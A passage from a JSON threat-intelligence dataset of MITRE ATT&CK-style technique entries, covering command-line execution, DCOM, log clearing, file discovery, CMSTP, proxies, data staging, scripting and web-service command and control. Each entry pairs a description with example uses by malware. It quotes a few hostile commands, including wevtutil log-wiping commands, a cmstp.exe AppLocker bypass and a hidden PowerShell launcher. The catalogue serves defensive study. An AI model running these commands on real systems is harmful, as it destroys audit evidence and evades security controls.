      "has the ability to execute shell commands.",
      "executes cmd.exe to provide a reverse shell to adversaries.",
      "runs cmd.exe /c and sends the output to its C2.",
      "is capable of spawning a reverse shell on a victim.",
      "opens cmd.exe on the victim.",
      "has the capability to open a remote shell and run basic commands.",
      "uses the command line and rundll32.exe to execute.",
      "is used to execute programs and other actions at the command-line interface.",
      "RAT is able to open a command shell.",
      "has the ability to remotely execute commands.",
      "supports execution from the command-line.",
      "has been used to execute remote commands.",
      "allows actors to spawn a reverse shell on a victim.",
      "Several tools used by  have been command-line driven.",
      "ran a reverse shell with Meterpreter.",
      "malware uses cmd.exe to execute commands on victims.",
      "actors spawned shells on remote systems on a victim network to execute commands.",
      "An  downloader uses the Windows command \"cmd.exe\" /C whoami. The group also uses a tool to execute commands on remote computers.",
      "Following exploitation with  malware,  actors created a file containing a list of commands to be executed on the compromised computer.",
      "has used the Windows command shell to execute commands.",
      "Malware used by  can run commands on the command-line interface."
    ],
    "id": "T1059",
    "name": "Command-Line Interface",
    "similar_words": [
      "Command-Line Interface"
    ]
  },
  "attack-pattern--772bc7a8-a157-42cc-8728-d648e25c7fe7": {
    "description": "Windows Distributed Component Object Model (DCOM) is transparent middleware that extends the functionality of Component Object Model (COM) (Citation: Microsoft COM) beyond a local computer using remote procedure call (RPC) technology. COM is a component of the Windows application programming interface (API) that enables interaction between software objects. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE).\n\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry. (Citation: Microsoft COM ACL) (Citation: Microsoft Process Wide Com Keys) (Citation: Microsoft System Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.\n\nAdversaries may use DCOM for lateral movement. Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications (Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods. (Citation: Enigma MMC20 COM Jan 2017) (Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents (Citation: Enigma Excel DCOM Sept 2017) and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1173) (DDE) execution directly through a COM created instance of a Microsoft Office application (Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document.\n\nDCOM may also expose functionalities that can be leveraged during other areas of the adversary chain of activity such as Privilege Escalation and Persistence. (Citation: ProjectZero File Write EoP Apr 2018)",
    "example_uses": [
      "can use DCOM (targeting the 127.0.0.1 loopback address) to execute additional payloads on compromised hosts.",
      "can deliver \"beacon\" payloads for lateral movement by leveraging remote COM execution."
    ],
    "id": "T1175",
    "name": "Distributed Component Object Model",
    "similar_words": [
      "Distributed Component Object Model"
    ]
  },
  "attack-pattern--774a3188-6ba9-4dc4-879d-d54ee48a5ce9": {
    "description": "Data, such as sensitive documents, may be exfiltrated through the use of automated processing or [Scripting](https://attack.mitre.org/techniques/T1064) after being gathered during Collection. \n\nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over Command and Control Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).",
    "example_uses": [
      "performs data exfiltration is accomplished through the following command-line command: from <COMPUTER-NAME> (<Month>-<Day> <Hour>-<Minute>-<Second>).txt.",
      "exfiltrates collected files automatically over FTP to remote servers.",
      "automatically exfiltrates collected files via removable media when an infected device is connected to the second victim after receiving commands from the first victim.",
      "automatically searches for files on local drives based on a predefined list of file extensions and sends them to the command and control server every 60 minutes.  also automatically sends keylogger files and screenshots to the C2 server on a regular timeframe.",
      "When a document is found matching one of the extensions in the configuration,  uploads it to the C2 server."
    ],
    "id": "T1020",
    "name": "Automated Exfiltration",
    "similar_words": [
      "Automated Exfiltration"
    ]
  },
  "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69": {
    "description": "Adversaries may delete or alter generated artifacts on a host system, including logs and potentially captured files such as quarantined malware. Locations and format of logs will vary, but typical organic system logs are captured as Windows events or Linux/macOS files such as [Bash History](https://attack.mitre.org/techniques/T1139) and /var/log/* .\n\nActions that interfere with eventing and other notifications that can be used to detect intrusion activity may compromise the integrity of security solutions, causing events to go unreported. They may also make forensic analysis and incident response more difficult due to lack of sufficient data to determine what occurred.\n\n### Clear Windows Event Logs\n\nWindows event logs are a record of a computer's alerts and notifications. Microsoft defines an event as \"any significant occurrence in the system or in a program that requires users to be notified or an entry added to a log.\" There are three system-defined sources of Events: System, Application, and Security.\n \nAdversaries performing actions related to account management, account logon and directory service access, etc. may choose to clear the events in order to hide their activities.\n\nThe event logs can be cleared with the following utility commands:\n\n* wevtutil cl system\n* wevtutil cl application\n* wevtutil cl security\n\nLogs may also be cleared through other mechanisms, such as [PowerShell](https://attack.mitre.org/techniques/T1086).",
    "example_uses": [
      "delets all artifacts associated with the malware from the infected machine.",
      "has cleared select event log entries.",
      "cleared Windows event logs and other logs produced by tools they used, including system, security, terminal services, remote services, and audit logs. The actors also deleted specific Registry keys.",
      "clears the system event logs.",
      "removes logs from /var/logs and /Library/logs.",
      "contains code to clear event logs.",
      "clears event logs.",
      "has cleared logs during post compromise cleanup activities.",
      "creates a backdoor through which remote attackers can clear all system event logs.",
      "can overwrite Registry settings to reduce its visibility on the victim.",
      "has a module to clear event logs with PowerShell.",
      "has cleared event logs from victims.",
      "is capable of deleting Registry keys used for persistence.",
      "After encrypting log files, the log encryption module in  deletes the original, unencrypted files from the host.",
      "The  component KillDisk is capable of deleting Windows Event Logs.",
      "RAT is able to wipe event logs.",
      "has the ability to remove Registry entries that it created during execution.",
      "used  to remove artifacts from victims.",
      "has cleared event logs, including by using the commands wevtutil cl System and wevtutil cl Security."
    ],
    "id": "T1070",
    "name": "Indicator Removal on Host",
    "similar_words": [
      "Indicator Removal on Host"
    ]
  },
  "attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18": {
    "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. \n\n### Windows\n\nExample utilities used to obtain this information are dir and tree. (Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the Windows API.\n\n### Mac and Linux\n\nIn Mac and Linux, this kind of discovery is accomplished with the ls, find, and locate commands.",
    "example_uses": [
      "service-based DLL implant traverses the FTP server’s directories looking for files with keyword matches for computer names or certain keywords.",
      "identifies files with certain extensions from USB devices, then copies them to a predefined directory.",
      "lists the directories for Desktop, program files, and the user’s recently accessed files.",
      "can obtain a list of all files and directories as well as logical drives.",
      "used a batch script to gather folder and file names from victim hosts.",
      "searches the system for all of the following file extensions: .avi, .mov, .mkv, .mpeg, .mpeg4, .mp4, .mp3, .wav, .ogg, .jpeg, .jpg, .png, .bmp, .gif, .tiff, .ico, .xlsx, and .zip",
      "collected file listings of all default Windows directories.",
      "gathers file and directory information from the victim’s machine.",
      "used a tool called MailSniper to search for files on the desktop and another utility called Sobolsoft to extract attachments from EML files.",
      "searches for files on the victim's machine.",
      "lists files on the victim’s machine.",
      "looks for specific files and file types.",
      "enumerates directories and obtains file attributes on a system.",
      "has a command to search for files on the victim’s machine.",
      "collects a list of files and directories in C:\\ with the command dir /s /a c:\\ >> \"C:\\windows\\TEMP\\[RANDOM].tmp\".",
      "can list all files on a system.",
      "finds a specified directory, lists the files and metadata about those files.",
      "can lists information about files in a directory.",
      "collects the volumes mapped on the system, and also steals files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf, and .pdf.",
      "enumerates directories and scans for certain files.",
      "checks its directory location in an attempt to avoid launching in a sandbox.",
      "can search directories for files on the victim’s machine.",
      "has the capability to gather the victim's current directory.",
      "lists files in directories.",
      "gathers information on victim’s drives and has a plugin for document listing.",
      "recursively searches through directories for files.",
      "creates a backdoor through which remote attackers can check for the existence of files, including its own components, as well as retrieve a list of logical drives.",
      "can conduct file browsing.",
      "can list directory contents.",
      "can be used to locate certain types of files/directories in a system.(ex: locate all files with a specific extension, name, and/or age)",
      "creates a backdoor through which remote attackers can list contents of drives and search for files.",
      "can enumerate files and directories.",
      "can walk through directories and recursively search for strings in files.",
      "can gather victim drive information.",
      "creates a backdoor through which remote attackers can retrieve lists of files.",
      "searches for specified files.",
      "can enumerate drives and their types. It can also change file permissions using cacls.exe.",
      "identified and extracted all Word documents on a server by using a command containing * .doc and *.docx. The actors also searched for documents based on a specific date range and attempted to identify all installed software on a victim.",
      "may enumerate user directories on a victim.",
      "has a tool that looks for files and directories on the local file system.",
      "has collected a list of files from the victim and uploaded it to its C2 server, and then created a new list of specific files to steal.",
      "malware can list a victim's logical drives and the type, as well the total/free space of the fixed devices. Other malware can list a directory's contents.",
      "can list directories on a victim.",
      "can search files on a victim.",
      "can list files and directories.",
      "collects information about available drives, default browser, desktop file list, My Documents, Internet history, program files, and root of available drives. It also searches for ICS-related software files.",
      "searches for files created within a certain timeframe and whose file extension matches a predefined list.",
      "has commands to get the current directory name as well as the size of a file. It also has commands to obtain information about logical drives, drive type, and free space.",
      "searches victim drives for files matching certain extensions (“.skr”,“.pkr” or “.key”) or names.",
      "attempts to access the ADMIN$, C$\\Windows, D$\\Windows, and E$\\Windows shares on the victim with its current privileges.",
      "has used  to locate PDF, Excel, and Word documents during. The group also searched a compromised DCCC computer for specific terms.",
      "can list file and directory information.",
      "is capable of performing directory listings.",
      "contains commands to list files and directories, as well as search for files matching certain extensions from a defined list.",
      "searches attached and mounted drives for file extensions and keywords that match a predefined list.",
      "is capable of obtaining directory, file, and drive listings.",
      "is capable of listing files, folders, and drives on a victim.",
      "collects the victim's %TEMP% directory path and version of Internet Explorer.",
      "allows adversaries to search for files.",
      "has a command to list its directory and logical drives.",
      "has commands to enumerate all storage devices and to find all files that start with a particular string.",
      "is capable of identifying documents on the victim with the following extensions: .doc; .pdf, .csv, .ppt, .docx, .pst, .xls, .xlsx, .pptx, and .jpeg.",
      "scans the victim for files that contain certain keywords from a list that is obtained from the C2 as a text file. It also collects information about installed software.",
      "has a command to retrieve metadata for files on disk as well as a command to list the current working directory.",
      "allows adversaries to enumerate and modify the infected host's file system. It supports searching for directories, creating directories, listing directory contents, reading and writing to files, retrieving file attributes, and retrieving volume information.",
      "searches through the drive containing the OS, then all drive letters C through to Z, for documents matching certain extensions.",
      "has a command to upload to its C2 server information about files on the victim mobile device, including SD card size, installed app list, SMS content, contacts, and calling history.",
      "has commands to list drives on the victim machine and to list file information for a given directory.",
      "obtains installer properties from Uninstall Registry Key entries to obtain information about installed applications and how to uninstall certain applications.",
      "collects information from the victim, including installed drivers, programs previously executed by users, programs and services configured to automatically run at startup, files and folders present in any user's home folder, files and folders present in any user's My Documents, programs installed to the Program Files folder, and recently accessed files, folders, and programs.",
      "identifies files matching certain file extension and copies them to subdirectories it created.",
      "has the ability to enumerate drive types.",
      "is capable of enumerating and manipulating files and directories.",
      "An older version of  has a module that monitors all mounted volumes for files with the extensions .doc, .docx, .pgp, .gpg, .m2f, or .m2o.",
      "sets a WH_CBT Windows hook to search for and capture files on the victim.",
      "contains the readFiles function to return a detailed listing (sometimes recursive) of a specified directory.",
      "is capable of running commands to obtain a list of files and directories, as well as enumerating logical drives.",
      "has the ability to enumerate files and drives.",
      "is capable of listing contents of folders on the victim.  also searches for custom network encryption software on victims.",
      "automatically searches for files on local drives based on a predefined list of file extensions.",
      "can enumerate and search for files and directories.",
      "gathers a list of installed apps from the uninstall program Registry. It also gathers registered mail, browser, and instant messaging clients from the Registry.  has searched for given file types.",
      "has the ability to search for a given filename on a victim.",
      "has a command to return a directory listing for a specified directory.",
      "A module in  collects information about the paths, size, and creation time of files with specific file extensions, but not the actual content of the file.",
      "can be used to find files and directories with native functionality such as dir commands.",
      "identifies files and directories for collection by searching for specific file extensions or file modification time.",
      "has a command to obtain a directory listing.",
      "has the capability to obtain file and directory listings.",
      "has the capability to enumerate files.",
      "A variant of  executes dir C:\\progra~1 when initially run.",
      "searches for interesting files (either a default or customized set of file extensions) on the local system and removable media.",
      "can scan victim drives to look for specific banking software on the machine to determine next actions. It also looks at browsing history and open tabs for specific strings.",
      "A  payload has searched all fixed drives on the victim for files matching a specified list of extensions.",
      "Several  malware samples use a common function to identify target files by their extension.  malware families can also enumerate files and directories, including a Destover-like variant that lists files and gathers information for all drives.",
      "has used Android backdoors capable of enumerating specific files on the infected devices.",
      "actors used the following commands after exploiting a machine with  malware to obtain information about files and directories: dir c:\\ >> %temp%\\download dir \"c:\\Documents and Settings\" >> %temp%\\download dir \"c:\\Program Files\\\" >> %temp%\\download dir d:\\ >> %temp%\\download",
      "surveys a system upon check-in to discover files in specific locations on the hard disk %TEMP% directory, the current user's desktop, and in the Program Files directory.",
      "uses command-line interaction to search files and directories."
    ],
    "id": "T1083",
    "name": "File and Directory Discovery",
    "similar_words": [
      "File and Directory Discovery"
    ]
  },
  "attack-pattern--7c93aa74-4bc0-4a9e-90ea-f25f86301566": {
    "description": "The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. (Citation: Endgame Process Injection July 2017) Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses [Hooking](https://attack.mitre.org/techniques/T1179) to redirect the code as necessary in order to communicate with the OS. A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:\n\n* %WINDIR%\\AppPatch\\sysmain.sdb\n* hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb\n\nCustom databases are stored in:\n\n* %WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom\n* hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom\n\nTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088) (UAC) (RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress). Similar to [Hooking](https://attack.mitre.org/techniques/T1179), utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc.",
    "example_uses": [
      "has used application shim databases for persistence."
    ],
    "id": "T1138",
    "name": "Application Shimming",
    "similar_words": [
      "Application Shimming"
    ]
  },
  "attack-pattern--7d6f590f-544b-45b4-9a42-e0805f342af3": {
    "description": "The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.\n\nAdversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https://attack.mitre.org/techniques/T1117) / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other whitelisting defenses since CMSTP.exe is a legitimate, signed Microsoft application.\n\nCMSTP.exe can also be abused to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)",
    "example_uses": [
      "has used the command cmstp.exe /s /ns C:\\Users\\ADMINI~W\\AppData\\Local\\Temp\\XKNqbpzl.txt to bypass AppLocker and launch a malicious script.",
      "has used CMSTP.exe and a malicious INF to execute its  payload."
    ],
    "id": "T1191",
    "name": "CMSTP",
    "similar_words": [
      "CMSTP"
    ]
  },
  "attack-pattern--7d751199-05fa-4a72-920f-85df4506c76c": {
    "description": "To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.",
    "example_uses": [
      "uses a copy of tor2web proxy for HTTPS communications.",
      "downloads and installs Tor via homebrew.",
      "uses Tor for command and control.",
      "A backdoor used by  created a Tor hidden service to forward traffic from the Tor client to local ports 3389 (RDP), 139 (Netbios), and 445 (SMB) enabling full remote access from outside the network.",
      "Traffic traversing the  network will be forwarded to multiple nodes before exiting the  network and continuing on to its intended destination."
    ],
    "id": "T1188",
    "name": "Multi-hop Proxy",
    "similar_words": [
      "Multi-hop Proxy"
    ]
  },
  "attack-pattern--7dd95ff6-712e-4056-9626-312ea4ab4c5e": {
    "description": "Collected data is staged in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Data Compressed](https://attack.mitre.org/techniques/T1002) or [Data Encrypted](https://attack.mitre.org/techniques/T1022).\n\nInteractive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.",
    "example_uses": [
      "determines a working directory where it stores all the gathered data about the compromised machine.",
      "created a directory named \"out\" in the user's %AppData% folder and copied files to it.",
      "adds collected files to a temp.zip file saved in the %temp% folder, then base64 encodes it and uploads it to control server.",
      "copied all targeted files to a directory called index that was eventually uploaded to the C&C server.",
      "uses a hidden directory named .calisto to store data from the victim’s machine before exfiltration.",
      "writes multiple outputs to a TMP file using the >> method.",
      "stores information gathered from the endpoint in a file named 1.hwp.",
      "stages the output from command execution and collected files in specific folders before exfiltration.",
      "stages collected data in a text file.",
      "stores the gathered data from the machine in .db files and .bmp files under four separate locations.",
      "stages command output and collected data in files before exfiltration.",
      "aggregates collected data in a tmp file.",
      "has used C:\\Windows\\Debug and C:\\Perflogs as staging directories.",
      "aggregates staged data from a network into a single location.",
      "scripts save memory dump data into a specific directory on hosts in the victim environment.",
      "has been known to stage files for exfiltration in a single location.",
      "Data captured by  is placed in a temporary file under a directory named \"memdump\".",
      "creates folders to store output from batch scripts prior to sending the information to its C2 server.",
      "stores output from command execution in a .dat file in the %TEMP% directory.",
      "stages data it copies from the local system or removable drives in the \"%WINDIR%\\$NtUninstallKB885884$\\\" directory.",
      "creates various subdirectories under %Temp%\\reports\\% and copies files to those subdirectories. It also creates a folder at C:\\Users\\<Username>\\AppData\\Roaming\\Microsoft\\store to store screenshot JPEG files.",
      "stages data prior to exfiltration in multi-part archives, often saved in the Recycle Bin.",
      "copies documents under 15MB found on the victim system to is the user's %temp%\\SMB\\ folder. It also copies files from USB devices to a predefined directory.",
      "Modules can be pushed to and executed by  that copy data to a staging area, compress it, and XOR encrypt it.",
      "can create a directory (C:\\ProgramData\\Mail\\MailAg\\gl) to use as a temporary directory for uploading files.",
      "collects files matching certain criteria from the victim and stores them in a local directory for later exfiltration.",
      "creates a directory, %USERPROFILE%\\AppData\\Local\\SKC\\, which is used to store collected log files.",
      "copies files from removable drives to C:\\system.",
      "identifies files with certain extensions and copies them to a directory in the user's profile.",
      "saves information from its keylogging routine as a .zip file in the present working directory.",
      "TRINITY malware used by  identifies payment card track data on the victim and then copies it to a local file in a subdirectory of C:\\Windows\\. Once the malware collects the data,  actors compressed data and moved it to another staging system before exfiltration.",
      "malware IndiaIndia saves information gathered about the victim to a file that is saved in the %TEMP% directory, then compressed, encrypted, and uploaded to a C2 server.",
      "has staged encrypted archives for exfiltration on Internet-facing servers that had previously been compromised with .",
      "has stored captured credential information in a file named pi.log."
    ],
    "id": "T1074",
    "name": "Data Staged",
    "similar_words": [
      "Data Staged"
    ]
  },
  "attack-pattern--7e150503-88e7-4861-866b-ff1ac82c4475": {
    "description": "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \n\n### Windows\n\nUtilities and commands that acquire this information include [netstat](https://attack.mitre.org/software/S0104), \"net use,\" and \"net session\" with [Net](https://attack.mitre.org/software/S0039).\n\n### Mac and Linux \n\nIn Mac and Linux, netstat and lsof can be used to list current connections. who -a and w can be used to show which users are currently logged in, similar to \"net session\".",
    "example_uses": [
      "uses netstat -ano to search for specific IP address ranges.",
      "executes the netstat -ano command.",
      "collects a list of active and listening connections by using the command netstat -nao as well as a list of available network mappings with net use.",
      "uses the netstat command to find open ports on the victim’s machine.",
      "can gather information about TCP connection state.",
      "has a built-in utility command for netstat, can do net session through PowerView, and has an interactive shell which can be used to discover additional information.",
      "has a tool that can enumerate current network connections.",
      "has used netstat -an on a victim to get a listing of network connections.",
      "enumerates the current network connections similar to  net use .",
      "may collect active network connections by running netstat -an on a victim.",
      "uses  to list TCP connection status.",
      "can be used to discover current NetBIOS sessions.",
      "has gathered information about local network connections using .",
      "The discovery modules used with  can collect information on network connections.",
      "Commands such as net use and net session can be used in  to gather information about network connections from a particular host.",
      "may use netstat -ano to display active network connections.",
      "can be used to enumerate local network connections, including active TCP connections and other network statistics.",
      "can enumerate drives and Remote Desktop sessions.",
      "can obtain a list of active connections and open ports.",
      "has used net use to conduct internal discovery of systems. The group has also used quser.exe to identify existing RDP sessions on a victim.",
      "has used net use to conduct connectivity checks to machines.",
      "obtains and saves information about victim network interfaces and addresses.",
      "actors used the following command following exploitation of a machine with  malware to display network connections: netstat -ano >> %temp%\\download",
      "surveys a system upon check-in to discover active local network connections using the netstat -an, net use, net file, and net session commands.",
      "performs local network connection discovery using netstat."
    ],
    "id": "T1049",
    "name": "System Network Connections Discovery",
    "similar_words": [
      "System Network Connections Discovery"
    ]
  },
  "attack-pattern--7fd87010-3a00-4da3-b905-410525e8ec44": {
    "description": "Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.\n\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), where adversaries will rely on macos being allowed or that the user will accept to activate them.\n\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. (Citation: Metasploit) (Citation: Metasploit),  (Citation: Veil) (Citation: Veil), and PowerSploit (Citation: Powersploit) are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. (Citation: Alperovitch 2014)",
    "example_uses": [
      "downloaded and launched code within a SCT file.",
      "embeds a Visual Basic script within a malicious Word document as part of initial access; the script is executed when the Word document is opened. The actors also used batch scripting.",
      "A Destover-like variant used by  uses a batch file mechanism to delete its binaries from the system.",
      "executes BAT and VBS scripts.",
      "makes modifications to open-source scripts from GitHub and executes them on the victim’s machine.",
      "uses a batch file to kill a security program task and then attempts to remove itself.",
      "To assist in establishing persistence,  creates %APPDATA%\\OneDrive.bat and saves the following string to it:powershell.exe -WindowStyle Hidden -exec bypass -File “%APPDATA%\\OneDrive.ps1”.",
      "has sent Word OLE compound documents with malicious obfuscated VBA macros that will run upon user execution. The group has also used an exploit toolkit known as Threadkit that launches .bat files.",
      "has used macros in Word documents that would download a second stage if executed.",
      "infected victims using JavaScript code.",
      "executes batch scripts on the victim’s machine.",
      "has used malicious macros embedded inside Office documents to execute files.",
      "used various types of scripting to perform operations, including Python and batch scripts. The group was observed installing Python 2.7 on a victim.",
      "has used shell and VBS scripts as well as embedded macros for execution.",
      "loads malicious shellcode and executes it in memory.",
      "uses Python for scripting to execute additional commands.",
      "uses a batch file to delete itself.",
      "dropper creates VBS scripts on the victim’s machine.",
      "executes shellcode and a script to decode Base64 strings.",
      "has used batch scripts in its malware to install persistence mechanisms.",
      "creates and uses a VBScript as part of its persistent execution.",
      "uses macOS' .command file type to script actions.",
      "used VBS and JavaScript scripts to help perform tasks on the victim's machine.",
      "uses VBScripts and batch scripts.",
      "has used macros in s as well as executed VBScripts on victim machines.",
      "adds a Visual Basic script in the Startup folder to deploy the payload.",
      "can uninstall malware components using a batch script. Additionally, a malicious Word document used for delivery uses VBA macros for execution.",
      "used Visual Basic Scripts (VBS), JavaScript code, batch files, and .SCT files on victim machines.",
      "performs most of its operations using Windows Script Host (Jscript and VBScript) and runs arbitrary shellcode .",
      "An  loader Trojan uses a batch script to run its payload.",
      "has used a Batch file to automate frequently executed post compromise cleanup activities.",
      "can use an add on feature when creating payloads that allows you to create custom Python scripts (“scriptlets”) to perform tasks offline (without requiring a session) such as sandbox detection, adding persistence, etc.",
      "has a VBScript for execution.",
      "has used VBScript and JavaScript files to execute its  payload.",
      "executes additional Jscript and VBScript code on the victim's machine.",
      "can execute commands with script as well as execute JavaScript.",
      "has used multiple types of scripting for execution, including JavaScript, JavaScript Scriptlets in XML, and VBScript.",
      "has used VBS, VBE, and batch scripts for execution.",
      "malware has used .vbs scripts for execution.",
      "has used various types of scripting for execution, including .bat and .vbs scripts. The group has also used macros to deliver malware such as  and .",
      "scans processes on all victim systems in the environment and uses automated scripts to pull back the results.",
      "One version of  consists of VBScript and PowerShell scripts. The malware also uses batch scripting.",
      "can use PowerSploit or other scripting frameworks to perform execution.",
      "has executed malicious .bat files containing PowerShell commands.",
      "uses batch scripts for various purposes, including to restart and uninstall itself.",
      "uses a module to execute Mimikatz with PowerShell to perform .",
      "has used various batch scripts to establish C2, download additional files, and conduct other functions.",
      "malware uses PowerShell and WMI to script data collection and command execution on the victim.",
      "has used a Metasploit PowerShell module to download and execute shellcode and to set up a local listener.  has also used scripting to iterate through a list of compromised PoS systems, copy data to a log file, and remove the original data files.",
      "has used PowerShell on victim systems to download and run payloads after exploitation.",
      "has used encoded PowerShell scripts uploaded to  installations to download and install , as well as to evade defenses.",
      "has used PowerShell scripts to download and execute programs in memory, without writing to disk.",
      "has used batch scripting to automate execution of commands."
    ],
    "id": "T1064",
    "name": "Scripting",
    "similar_words": [
      "Scripting"
    ]
  },
  "attack-pattern--804c042c-cfe6-449e-bc1a-ba0a998a70db": {
    "description": "Adversaries may add malicious content to an internally accessible website through an open network file share that contains the website's webroot or Web content directory (Citation: Microsoft Web Root OCT 2016) (Citation: Apache Server 2018) and then browse to that content with a Web browser to cause the server to execute the malicious content. The malicious content will typically run under the context and permissions of the Web server process, often resulting in local system or administrative privileges, depending on how the Web server is configured.\n\nThis mechanism of shared access and remote execution could be used for lateral movement to the system running the Web server. For example, a Web server running PHP with an open network share could allow an adversary to upload a remote access tool and PHP script to execute the RAT on the system running the Web server when a specific page is visited. (Citation: Webroot PHP 2011)",
    "example_uses": [],
    "id": "T1051",
    "name": "Shared Webroot",
    "similar_words": [
      "Shared Webroot"
    ]
  },
  "attack-pattern--830c9528-df21-472c-8c14-a036bf17d665": {
    "description": "Adversaries may use an existing, legitimate external Web service as a means for relaying commands to a compromised system.\n\nThese commands may also include pointers to command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
    "example_uses": [
      "used legitimate services like Google Docs, Google Scripts, and Pastebin for C2.",
      "leverages legitimate social networking sites and cloud platforms (Twitter, Yandex, and Mediafire) for command and control communications.",
      "A  JavaScript backdoor has used Google Apps Script as its C2 server.",
      "uses blogs and third-party sites (GitHub, tumbler, and BlogSpot) to avoid DNS-based blocking of their communication to the command and control server.",
      "has used compromised WordPress blogs as C2 servers.",
      "communicates to the C2 server by retrieving a Google Doc.",
      "has received C2 instructions from user profiles created on legitimate websites such as Github and TechNet.",
      "has used Technet and Pastebin web pages for command and control.",
      "is capable of leveraging cloud storage APIs such as Cloud, Box, Dropbox, and Yandex for C2.",
      "MSGET downloader uses a dead drop resolver to access malicious payloads.",
      "leverages social networking sites and cloud platforms (AOL, Twitter, Yandex, Mediafire, pCloud, Dropbox, and Box) for C2.",
      "can use public cloud-based storage providers for command and control.",
      "has used AOL Instant Messenger for C2.",
      "uses cloud based services for C2.",
      "malware can use a SOAP Web service to communicate with its C2 server.",
      "communicates to servers operated by Google using the Jabber/XMPP protocol.",
      "The  malware communicates through the use of events in Google Calendar.",
      "uses Microsoft’s TechNet Web portal to obtain a dead drop resolver containing an encoded tag with the IP address of a command and control server. It has also obfuscated its C2 traffic as normal traffic to sites such as Github.",
      "uses Twitter as a backup C2 channel to Twitter accounts specified in its configuration file.",
      "One variant of  uses a Microsoft OneDrive account to exchange commands and stolen data with its operators.",
      "The \"tDiscoverer\" variant of  establishes a C2 channel by downloading resources from Web services like Twitter and GitHub.  binaries contain an algorithm that generates a different Twitter handle for the malware to check for instructions every day.",
      "uses Pastebin to store its real C2 addresses.",
      "uses the Dropbox cloud storage service for command and control.",
      "can use multiple C2 channels, including RSS feeds, Github, forums, and blogs.  also collects C2 information via a dead drop resolver.",
      "Some  components use Twitter to initially obtain the address of a C2 server or as a backup if no hard-coded C2 server responds.",
      "uses Twitter as a backup C2 method. It also has a module designed to post messages to the Russian VKontakte social media site.",
